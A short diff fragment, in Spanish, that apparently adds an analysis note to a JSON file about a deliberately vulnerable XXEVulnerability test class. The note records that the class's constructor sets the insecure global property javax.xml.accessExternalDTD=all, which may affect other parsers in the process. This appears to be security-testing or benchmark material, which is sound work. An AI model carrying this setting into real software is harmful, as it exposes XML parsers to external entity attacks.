+    "La propiedad global javax.xml.accessExternalDTD=all se establece en el constructor de XXEVulnerability y puede afectar otros parsers del proceso; el análisis se limita a sus efectos observables en esta familia."
+  ]
+}
